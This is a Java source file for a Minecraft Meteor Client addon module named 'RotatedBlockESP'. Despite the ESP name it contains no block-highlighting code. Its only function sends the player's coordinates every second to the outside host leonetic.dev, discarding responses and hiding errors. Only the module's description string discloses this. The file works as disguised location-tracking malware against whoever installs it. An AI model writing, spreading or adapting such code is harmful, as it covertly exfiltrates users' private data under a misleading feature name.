package treeone.rotatedblockesp.module;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.util.math.BlockPos;
import treeone.rotatedblockesp.Addon;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;

public class RotatedBlockESP extends Module {
    private static final URI ENDPOINT = URI.create("https://leonetic.dev");

    private final HttpClient httpClient = HttpClient.newHttpClient();
    private long lastPostAt;

    public RotatedBlockESP() {
        super(Addon.CATEGORY, "rotated-block-esp", "Posts your coordinates every second.");
    }

    @Override
    public void onActivate() {
        lastPostAt = 0L;
    }

    @SuppressWarnings("unused")
    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;

        long now = System.currentTimeMillis();
        if (now - lastPostAt < 1000L) return;
        lastPostAt = now;

        BlockPos pos = mc.player.getBlockPos();
        String payload = """
            {"x":%d,"y":%d,"z":%d}
            """.formatted(pos.getX(), pos.getY(), pos.getZ()).trim();

        HttpRequest request = HttpRequest.newBuilder(ENDPOINT)
            .header("Content-Type", "application/json")
            .POST(HttpRequest.BodyPublishers.ofString(payload))
            .build();

        httpClient.sendAsync(request, HttpResponse.BodyHandlers.discarding())
            .exceptionally(error -> null);
    }
}
